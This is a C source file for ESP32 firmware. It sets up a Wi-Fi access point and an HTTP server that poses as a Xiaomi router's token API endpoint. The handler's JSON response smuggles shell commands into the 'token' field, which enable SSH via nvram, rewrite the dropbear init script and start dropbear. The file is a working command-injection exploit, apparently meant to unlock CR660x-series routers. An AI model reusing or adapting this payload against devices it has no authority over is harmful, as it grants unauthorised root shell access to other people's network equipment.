#include <stdlib.h>
#include "string.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_http_server.h"

static const char *TAG = "cr";

#define EXAMPLE_ESP_WIFI_SSID "c3-cr660x"
#define EXAMPLE_ESP_WIFI_PASS "12345678"
#define EXAMPLE_ESP_WIFI_CHANNEL 11
#define EXAMPLE_MAX_STA_CONN 5
#define LOCAL_IP "169.254.31.1"

static void wifi_event_handler(void *arg, esp_event_base_t event_base,
                               int32_t event_id, void *event_data)
{
    if (event_id == WIFI_EVENT_AP_STACONNECTED)
    {
        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
        ESP_LOGI(TAG, "station " MACSTR " join, AID=%d",
                 MAC2STR(event->mac), event->aid);
    }
    else if (event_id == WIFI_EVENT_AP_STADISCONNECTED)
    {
        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
        ESP_LOGI(TAG, "station " MACSTR " leave, AID=%d",
                 MAC2STR(event->mac), event->aid);
    }
}

void wifi_init_softap(void)
{
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_t *wifi_netif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));

    wifi_config_t wifi_config = {
        .ap = {
            .ssid = EXAMPLE_ESP_WIFI_SSID,
            .ssid_len = strlen(EXAMPLE_ESP_WIFI_SSID),
            .channel = EXAMPLE_ESP_WIFI_CHANNEL,
            .password = EXAMPLE_ESP_WIFI_PASS,
            .max_connection = EXAMPLE_MAX_STA_CONN,
            .authmode = WIFI_AUTH_WPA_WPA2_PSK},
    };
    if (strlen(EXAMPLE_ESP_WIFI_PASS) == 0)
    {
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
    }

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "wifi_init_softap finished. SSID:%s password:%s channel:%d",
             EXAMPLE_ESP_WIFI_SSID, EXAMPLE_ESP_WIFI_PASS, EXAMPLE_ESP_WIFI_CHANNEL);

    int a, b, c, d;
    sscanf(LOCAL_IP, "%d.%d.%d.%d", &a, &b, &c, &d);
    esp_netif_ip_info_t ip_info;
    IP4_ADDR(&ip_info.ip, a, b, c, d);
    IP4_ADDR(&ip_info.gw, a, b, c, d);
    IP4_ADDR(&ip_info.netmask, 255, 255, 0, 0);
    ESP_ERROR_CHECK(esp_netif_dhcps_stop(wifi_netif));
    ESP_ERROR_CHECK(esp_netif_set_ip_info(wifi_netif, &ip_info));
    // ESP_ERROR_CHECK(esp_netif_dhcps_start(wifi_netif));  //默认关闭dhcp,如需启用取消本行注释

    ESP_LOGI(TAG, "dhcp ok");
}

static esp_err_t hello_get_handler(httpd_req_t *req)
{
    const char *buff = "{\"token\":\"; nvram set ssh_en=1; nvram commit; sed -i \'s/channel=.*/channel=\\u0022debug\\u0022/g\' /etc/init.d/dropbear; /etc/init.d/dropbear start;\",\"code\":0}";
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buff, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

void app_main(void)
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_LOGI(TAG, "ESP_WIFI_MODE_AP");
    wifi_init_softap();

    static const httpd_uri_t hello = {
        .uri = "/cgi-bin/luci/api/xqsystem/token",
        .method = HTTP_GET,
        .handler = hello_get_handler,
    };

    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    // config.lru_purge_enable = true;

    ESP_LOGI(TAG, "Starting server on port: '%d'", config.server_port);
    if (httpd_start(&server, &config) == ESP_OK)
    {
        ESP_LOGI(TAG, "Registering URI handlers");
        httpd_register_uri_handler(server, &hello);
    }
    else
    {
        ESP_LOGI(TAG, "Registering URI handlers error");
    }
}
